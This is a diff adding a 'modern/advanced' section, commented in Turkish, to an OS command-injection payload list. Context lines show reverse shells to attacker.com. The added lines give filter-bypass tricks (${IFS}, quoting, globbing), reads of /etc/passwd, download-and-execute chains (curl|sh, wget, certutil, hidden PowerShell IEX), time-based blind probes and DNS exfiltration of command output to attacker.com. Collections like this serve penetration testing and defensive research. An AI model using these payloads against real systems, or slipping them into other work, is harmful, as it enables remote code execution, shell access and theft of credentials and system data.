@@ -385,3 +385,37 @@ Content-Disposition: form-data; name="file"; filename="`id`.jpg"
 ;php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 ;sh -i >& /dev/tcp/attacker.com/4444 0>&1
 ;nc attacker.com 4444 -e /bin/sh
+
+# ── [v2026-06] MODERN / ADVANCED ADDITIONS ──
+# ${IFS} / brace expansion / boşluk bypass
+;${IFS}id
+;cat${IFS%??}/etc/passwd
+;cat$IFS$9/etc/passwd
+{cat,/etc/passwd}
+cat</etc/passwd
+;/???/??t /???/p??s??
+# karakter araya sokma (filtre bypass)
+;u'n'a'm'e -a
+;c\at /e\tc/pa\sswd
+;n''sl''ookup attacker.com
+# base64 decode + indir-çalıştır zinciri
+;echo${IFS}aWQ=|base64${IFS}-d|sh
+;curl${IFS}attacker.com|sh
+;wget${IFS}attacker.com/s;sh${IFS}s
+# zaman tabanlı blind (Linux/Windows)
+$(sleep 5)
+&ping -n 5 127.0.0.1
+&timeout /t 5
+# OOB DNS exfil (komut çıktısını subdomain'e koy)
+|nslookup $(whoami).attacker.com
+;curl http://$(whoami).attacker.com
+;dig `id|base64`.attacker.com
+# Windows indir-çalıştır
+&certutil -urlcache -f http://attacker.com/x.exe x.exe
+&powershell -nop -w hidden -enc SQBFAFgA
+&powershell IEX(New-Object Net.WebClient).downloadString('http://attacker.com/x')
+# URL-encoded ayraçlar
+%0d%0aid
+%26%26id
+%3Bid
+%7Cid
